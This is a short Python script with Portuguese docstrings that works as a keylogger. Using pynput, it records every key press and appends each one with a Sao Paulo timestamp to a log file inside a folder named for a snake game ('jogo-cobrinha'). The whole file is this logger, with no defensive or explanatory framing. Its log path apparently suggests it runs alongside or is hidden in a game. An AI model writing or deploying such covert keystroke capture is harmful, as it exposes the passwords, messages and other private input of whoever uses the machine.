from pynput.keyboard import Listener
from datetime import datetime
from datetime import date
from pytz import timezone


def horacerta(horaminuto):
    """
    Informa a data e a hora com base no relógio do dispositivo
    :horaminuto: = Variavél que informa qual informação a ser retornada
    :return: = Retorna a hora, minuto, dia, mes com base na variavel 'horaminuto'
    """
    deha = datetime.now()
    fh = timezone('America/Sao_Paulo')
    dehsp = deha.astimezone(fh)
    dehspet = dehsp.strftime('%d/%m/%Y %H:%M')
    minut = int(dehspet[-2:])
    hora = int(dehspet[-5:-3])
    dia = int(dehspet[:2])
    mes = int(dehspet[3:5])
    dic = {'hora' : hora, 'minuto' : minut, 'dia' : dia, 'mes' : mes,}
    return dic[horaminuto]

logFile = r"jogo-cobrinha\log.txt"

def writeLog(key):
    keydata = str(key)

    with open(logFile, "a") as f:
        f.write(f'{keydata} {horacerta("hora")}:{horacerta("minuto")} \n')


with Listener(on_press=writeLog) as l:
    l.join()